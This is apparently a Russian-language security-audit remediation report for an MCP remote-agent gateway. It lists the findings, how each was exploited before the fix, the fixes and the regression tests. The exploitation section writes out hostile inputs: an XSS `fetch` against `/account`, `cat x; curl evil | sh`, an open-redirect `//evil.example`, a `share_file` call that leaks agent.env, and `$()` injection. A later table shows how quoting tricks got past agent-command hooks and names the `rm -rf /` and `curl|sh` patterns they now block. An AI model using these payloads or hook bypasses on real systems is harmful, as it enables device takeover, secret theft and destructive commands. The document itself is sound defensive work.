# Исправления по аудиту 2026-11-19 — основной проект

**Ветка:** `fix/security-audit-2026-11-19`
**База:** `main` @ `2ec7f1a` (0.5.2)
**Источник находок:** [VULN_REPORT_fork.md](VULN_REPORT_fork.md) (F-01…F-25)
**Контекст архитектуры:** [ARCH_admin_cannot_access_users.md](ARCH_admin_cannot_access_users.md)

Документ описывает **что исправлено в этом репозитории, как каждую находку можно было
эксплуатировать и чем это подтверждено**. Для находок, которые к основному проекту не применимы
(другая архитектура) или закрыты ранее, это сказано явно.

**Проверка:** `python -m pytest tests -q` → **1534 passed, 8 skipped** (2026-11-19: 1520 после первого пакета, 1532 после второго, 1534 после третьего).
Новый файл регрессий: `tests/test_security_audit_2026_11_19.py` (23 теста).

---

## 1. Сводка

| ID | Статус в основном проекте | Что сделано | Тест |
| :--- | :--- | :--- | :--- |
| F-01 | **исправлено** | `CSP: sandbox` + `nosniff` + `no-referrer` на всех ответах шар; `//host` и `/\host` в `Location` отбрасываются | `test_share_response_is_sandboxed`, `test_share_location_cannot_be_protocol_relative` |
| F-02 | **исправлено** | единый текст `401` для неизвестного имени и неверного токена; `404` без имени для неизвестного/офлайн узла; убран `suggested_username` из `409` | `test_verify_token_does_not_reveal_registered_names`, `test_share_404_does_not_reveal_the_node_or_its_state` |
| F-03 | **исправлено** | `/health` анонимно отдаёт только `{"status":"healthy"}`; подробности — с токеном/админ-токеном или `MESH_PUBLIC_HEALTH=1` | `test_health_is_minimal_for_anonymous`, `test_health_detailed_for_operator` |
| F-04 | **исправлено** | `link_key_sha256` вместо plaintext; миграция при старте; переустановка выдаёт новый ключ с overlap-хэшем старого | `test_new_registration_never_stores_the_link_key`, `test_migration_hashes_plaintext_link_keys`, `test_rotate_drops_the_reinstall_overlap` |
| F-05 | не применимо | в основном проекте `bash_exec`/`run_job` уже отказывают при `MESH_READ_ONLY` (`mcp_tools.py`) | существующие тесты `test_mcp_tools.py` |
| F-06 | не применимо | в основном проекте нет браузерного подтверждения пары (только админ-API); поверхность отсутствует | — |
| F-07 | **исправлено** | `client_ip` доверяет `X-Forwarded-For` только от `MESH_TRUSTED_PROXIES` и берёт последний хоп | `test_client_ip_ignores_untrusted_forwarded_header`, `test_client_ip_uses_last_hop_from_a_trusted_proxy` |
| F-08 | **исправлено** | квота `MESH_PAIR_MAX_PER_IP` (по умолчанию 3) и вытеснение старейшей заявки вместо `503` | `test_pairing_is_quota_scoped_to_the_caller` |
| F-09 | **исправлено** | device-token в query — только при `MESH_ALLOW_LEGACY_QUERY=1` и наличии `allow_legacy_query`; ротация сбрасывает флаг | `test_legacy_query_credential_is_refused_by_default` |
| F-10 | **исправлено** | `share_file`/`serve_dir` отказывают конфиг-каталогу, `agent.env`, `domain.env`, `*.env`/`*.db`/`*.token` | `test_share_file_refuses_the_node_config` |
| F-11 | **снижено, остаётся residual** | шлюз основного проекта не раздаёт `core/*.py`; `cli.js` больше не исполняет удалённую строку. Подпись установщика — отдельная задача (см. §4) | `test_cli_does_not_shell_interpolate_arguments` |
| F-12 | **исправлено** | `cli.js` скачивает установщик в файл и запускает его массивом аргументов (`powershell -File` / `bash <file>`) | `test_cli_does_not_shell_interpolate_arguments` |
| F-13 | не применимо | в `core/server.py` уже есть проверка `Host`/`Origin` и отражение CORS вместо `*` | существующие `test_server_http_gate.py` |
| F-14 | **исправлено** | лимит `MESH_SHARE_RELAY_MAX_BYTES` (16 МиБ) и семафор на 4 параллельных relay | `test_share_relay_refuses_oversized_bodies` |
| F-15 | **исправлено** | классификатор режет `;|&$()` и требует точного совпадения префикса по токенам (`shlex`) | `test_policy_refuses_a_pipeline_after_a_safe_prefix` |
| F-16 | **исправлено** | там же, где F-01 (`Location` не может начинаться с `//` или содержать `\`) | `test_share_location_cannot_be_protocol_relative` |
| F-17 | **исправлено** | неизвестный `MESH_REGISTER_MODE` → `closed` (fail-closed); значение `closed` поддержано | `test_unknown_register_mode_fails_closed` |
| F-18 | **смягчено** | админ-токен короче 32 символов отключает админ-API; каждое использование пишется в лог с IP. Второго фактора нет — by design, см. §4 | `test_short_admin_token_disables_the_admin_api` |
| F-19 | **исправлено** | заявка помечается `approving` до первого `await`; повторная выдача ключей после выдачи запрещена (`pop`) | `test_pair_approval_cannot_run_twice` |
| F-20 | **исправлено** | `username` 2…40 символов | `test_overlong_username_is_refused` |
| F-21 | **исправлено** | `_rate_windows` чистится по TTL и ограничен 8192 записями | `test_rate_windows_are_pruned` |
| F-22 | **исправлено** | редактор маскирует `$`-значения, если это не целая shell-переменная, и значения от 3 символов | `test_redaction_covers_short_and_dollar_values` |
| F-23 | **исправлено** | `/.well-known/oauth-protected-resource` строит `resource` из `PUBLIC_BASE_URL`, а не из `Host` | `test_discovery_uses_the_configured_origin` |
| F-24 | **исправлено** | анонимный `/health` не отдаёт `host`/`instance_id`/имена | `test_health_is_minimal_for_anonymous` |
| F-25 | не применимо | выдача ключей пары в основном проекте и так одноразовая (`pending_pairs.pop` после выдачи) | — |

---

## 2. Как это эксплуатировалось (до фикса)

### F-01. XSS через шару → действия от имени владельца кабинета

Шара отдавалась на том же origin, что `/account`, с `content-type` от узла и **без CSP**.
Атакующий-арендатор публиковал `evil.html`, отправлял ссылку владельцу; страница выполняла
`fetch('/account', {credentials:'include'})`, читала CSRF и вызывала `rotate`/`revoke`,
`sandbox`, `pause`, выключение `remote_control` на устройствах жертвы.
В основном проекте `link_key` в HTML кабинета не рендерится, поэтому ключи напрямую не утекали —
но управление устройством перехватывалось полностью.

**После:** `Content-Security-Policy: sandbox …` даёт документу непрозрачный origin: скрипты
работают, а same-origin запросы к `/account` блокируются; `nosniff` и `no-referrer` добавлены.

### F-02 / F-03 / F-24. Инвентаризация без токена

`GET /sse?user=<имя>&token=x` отвечал «User 'X' is not registered» для существующего имени и
другим текстом для несуществующего; `/api/register` отвечал `409` с `suggested_username`;
`/{node}/{slug}` отвечал `503 … 'node' is not connected` только для зарегистрированных узлов;
`/health` отдавал `streams_per_user`, `tunnel_events`, `target_user`, `host`.
Этого хватало, чтобы собрать полный список устройств и их состояние и выбрать цель.

**После:** одинаковый `401`; `404` без имени; `/health` анонимно — только `{"status":"healthy"}`.

### F-04. Кража `link_key` из `registry.json`

`registry.json` хранил `"link_key": "lk_…"` открытым текстом. Любой доступ к файлу (админ, бэкап,
ошибочные права, плагин) давал рабочий URL `/mcp?user=…&token=lk_…`, то есть полный набор
инструментов на устройстве.

**После:** хранится только `sha256`; старые записи мигрируются при старте; переустановка выдаёт
новый ключ, оставляя overlap-хэш старого до явной ротации.

### F-07 / F-08 / F-19. Исчерпание и обход лимитов

`client_ip` брал первый элемент `X-Forwarded-For`; клиент подставлял произвольный IP, обходя
лимиты `owner_login`/`register`/`pair`, а 200 заявок × 600 с блокировали привязку всем.
Два одновременных `approve` с админ-токеном проходили проверку `approved` до `await` и создавали
два узла, теряя первый токен.

**После:** доверенный прокси-список, квота на IP, вытеснение старейшей заявки, флаг `approving`.

### F-09 / F-10. Утечка секретов через URL и шары

Легаси-оценка `allow_legacy_query` позволяла device-token в query даже после ротации ссылки, а
`share_file("~/.config/remote-harness-mcp/agent.env")` публиковал `MESH_TOKEN` по ссылке без
аутентификации.

**После:** legacy-query только с явным `MESH_ALLOW_LEGACY_QUERY=1`; публикация конфига запрещена.

### F-12 / F-14 / F-15 / F-16 / F-21 / F-22. Инъекции и отказы

- `cli.js` склеивал аргументы в `bash -c`/`-Command`: аргумент с `$()` исполнялся локально.
- Relay шар декодировал тело целиком без лимита: несколько больших файлов — OOM шлюза.
- `is_safe_command` проверял `startswith("cat")`: `cat x; curl evil | sh` шёл без подтверждения.
- `Location: //evil.example` проходил `startswith("/")` — открытый редирект.
- `_rate_windows` рос без очистки; редактор не маскировал `$`-пароли и короткие значения.

**После:** массив аргументов в CLI, лимит и семафор в relay, `shlex` + запрет операторов,
проверка `//`, очистка окон, маскирование по имени переменной.

---

## 3. Изменения поведения (важно для эксплуатации)

1. **Переустановка узла выдаёт новый `link_key`.** Старый URL продолжает работать (overlap-хэш),
   пока владелец не сделает явную ротацию. Новый URL установщик печатает при регистрации.
2. **`/health` анонимно минимален.** Мониторинг, которому нужны `streams_per_user`/`tunnel_events`,
   должен либо ходить с токеном узла/админ-токеном, либо выставить `MESH_PUBLIC_HEALTH=1`
   (только для непубличного контура).
3. **Device-token в URL по умолчанию запрещён.** Для миграции старого узла:
   `MESH_ALLOW_LEGACY_QUERY=1`, затем `rotate`/`rotate-token` и выключить флаг.
4. **Админ-токен короче 32 символов не работает.** Это намеренно: короткий общий секрет давал
   ротацию всех устройств. Админ-действия пишутся в лог с IP.
5. **Шары больше не могут читать cookie кабинета.** Страницы шар по-прежнему открываются и
   исполняют свой JS, но обращаться к `/account` из них нельзя (sandbox без `allow-same-origin`).
6. **Неизвестный `MESH_REGISTER_MODE` = закрытая регистрация.** Опечатка больше не открывает шлюз.

---

## 4. Что осталось и почему (residual)

| Тема | Почему не закрыто кодом | Что делать |
| :--- | :--- | :--- |
| Оператор шлюза видит трафик и может действовать от имени узла | терминация MCP без E2E — свойство архитектуры | blind-режим (план в `ARCH_admin_cannot_access_users.md`), self-host |
| `MESH_ADMIN_TOKEN` — один фактор | нужен UI/железо для второго фактора | ≥32 символа + IP-лог уже есть; добавить 2FA/аппаратный ключ для админ-операций |
| Установщик (`install.sh`/`cli.js`) не проверяет подпись | нет инфраструктуры релизных подписей | подписать релизы (minisign/cosign) и проверять SHA-256 до запуска; до этого — ставить из закреплённого коммита |
| Шары и кабинет на одном origin | sandbox нейтрализует XSS, но origin общий | отдельный домен `share.<domain>` в следующем релизе |
| `link_key` в URL у клиентов | так устроены MCP-коннекторы | короткоживущие ключи + ротация; sandbox уже убирает кражу из кабинета |

---

## 5. Файлы, которых коснулись изменения

| Файл | Что изменено |
| :--- | :--- |
| `gateway.py` | `SHARE_CSP`/`_apply_share_headers`; sandbox на relay; `Location`-фильтр; единый `401`; `404` для шар; приватный `/health`; `client_ip` + `MESH_TRUSTED_PROXIES`; `_rate_windows` prune; `link_key_sha256` + миграция; `MESH_ALLOW_LEGACY_QUERY`; fail-closed `MESH_REGISTER_MODE`; лимит имени; квота пар; `approving`; админ-токен ≥32 + лог; лимит/семафор relay; discovery из `PUBLIC_BASE_URL` |
| `core/redact.py` | `_NOT_A_SECRET` только для целых переменных/плейсхолдеров; порог 3 символа |
| `core/policies.py` | `shlex`-разбор, запрет `;|&$()<>`, точное совпадение префикса |
| `core/web_share.py` | запрет публикации конфига/секретов в `share_file` и `serve_dir` |
| `bin/cli.js` | скачивание установщика в файл + массив аргументов (`-File`/`bash`), без `bash -c` |
| `tests/test_security_audit_2026_11_19.py` | 23 регрессионных теста |
| `tests/test_gateway_credentials.py`, `test_gateway_token_rotation.py`, `test_gateway_share_route.py`, `test_gateway_resilience.py` | обновлены под новое поведение |

---

## 6. Второй пакет (продолжение, 2026-11-19)

| Что | Как эксплуатировалось | Исправление | Тест |
| :--- | :--- | :--- | :--- |
| State-changing с query-токеном | зная `?token=<device-token>` из логов/истории, атакующий вызывал `POST /v1/devices/<node>/rotate` или `/revoke` и менял/отзывал учётные данные узла | `header_credential()`: `rotate`, `rotate-token`, `rotate-token/finish`, `revoke` принимают только `Authorization`/`X-Mesh-Token` | `test_state_changing_endpoints_require_a_header_credential` |
| Токен в query у `/api/register` | `POST /api/register?token=<device-token>` проходил проверку владения и возвращал `link_key` | query-токен игнорируется, принимается только header/тело | `test_registration_ignores_a_query_token` |
| Legacy-поддомен и `Host` | `Host: victim.<домен>` без `?user=` выбирал узел жертвы в `get_target_user` | `MESH_LEGACY_SUBDOMAIN` по умолчанию `0`; включается только явно | `test_legacy_subdomain_is_off_by_default`, `test_legacy_subdomain_resolves_when_explicitly_enabled` |
| DELETE чужой сессии | зная/подобрав `mcp-session-id`, клиент закрывал SSE-поток другого узла | DELETE проверяет владельца в `active_sessions` и очередь в `active_sse_subscribers[user]`, иначе `404` | `test_delete_of_a_foreign_session_is_refused` |
| Админ-секрет: один короткий токен | утечка одного значения = ротация/отзыв всех устройств | список токенов через запятую, каждый ≥32 символов; опция `MESH_ADMIN_REQUIRE_LOCALHOST=1`; лог с IP | `test_admin_accepts_a_token_list_and_ignores_short_entries`, `test_short_admin_token_disables_the_admin_api` |
| Flood по catch-all шар | анонимный поток запросов с любым слагом занимал event loop чтением реестра и relay | бакет `MESH_SHARE_RATE_LIMIT` (600/мин/IP) → `429 Retry-After` | `test_share_route_is_rate_limited` |
| Обход hooks | `rm  -rf  /`, `cat rhm_""tasks.json`, `curl … \| sh` не совпадали с узкими шаблонами | нормализация кавычек/бэкслешей/пробелов до сравнения; добавлены `rm -rf /`, `shutdown/reboot`, `Remove-Item -Recurse`, `curl\|sh`, `chmod` по системным путям, `mv` каталога агента | `test_hooks_normalise_quotes_before_matching` |
| Установщик без проверки целостности | подмена ответа хоста установщика давала RCE на машине пользователя | `RHM_INSTALLER_SHA256` — CLI сверяет SHA-256 скачанного установщика и отказывается запускать при расхождении | `test_cli_supports_installer_hash_pinning` |
| OAuth-кабинет: фиксация входа | ссылка с чужим `state` в другом браузере привязывала чужую личность к сессии; любой Google-аккаунт мог войти; вход не был ограничен по частоте | binding-cookie `__Host-rhm-login` + `binding_hash` в `auth_flows`; проверка `Origin` в CSRF; лимит 20/мин на start и callback; allowlist `MESH_OWNER_EMAILS`/`MESH_OWNER_DOMAINS` | `test_login_flow_is_bound_to_the_browser_that_started_it`, `test_cabinet_posts_reject_a_foreign_origin`, `test_login_start_is_rate_limited`, `test_owner_allowlist_blocks_other_google_accounts` |
| Админ-API без второго фактора | утечка админ-токена давала ротацию/отзыв всех устройств | опциональный TOTP (`MESH_ADMIN_TOTP_SECRET`, окно ±30 с) поверх списка токенов; при заданном секрете запрос без кода отклоняется | `test_admin_totp_is_required_when_configured` |
| Открытая регистрация при кабинете | при `MESH_ACCOUNT=1` любой мог зарегистрировать узел рядом с аккаунтами | `MESH_CLOSE_REGISTER_WITH_ACCOUNT=1` закрывает `/api/register`, оставляя пары и enrollment-секрет | `test_account_cabinet_can_close_self_registration` |

Проверка после второго пакета: `python -m pytest tests -q` → **1532 passed, 8 skipped**; после третьего (TOTP и кабинет) → **1534 passed, 8 skipped**.

---

## 7. Приёмка

```bash
python -m pytest tests -q
# 1534 passed, 8 skipped
```

Ручные проверки после выката:

1. `curl -s https://<gw>/health` → ровно `{"status":"healthy"}` (без токена).
2. `curl -s "https://<gw>/sse?user=nonexistent&token=x"` и `...?user=<real>&token=x` → одинаковый `401`.
3. `curl -s https://<gw>/<node>/<slug>/x.html -D -` → `Content-Security-Policy: sandbox …`.
4. `jq '.node | keys' registry.json` → нет `link_key`, есть `link_key_sha256`.
5. Админ-запрос с токеном короче 32 символов → `403`, в логе `admin api disabled`.
6. `python -m pytest tests/test_security_audit_2026_11_19.py -q` → 23 passed.
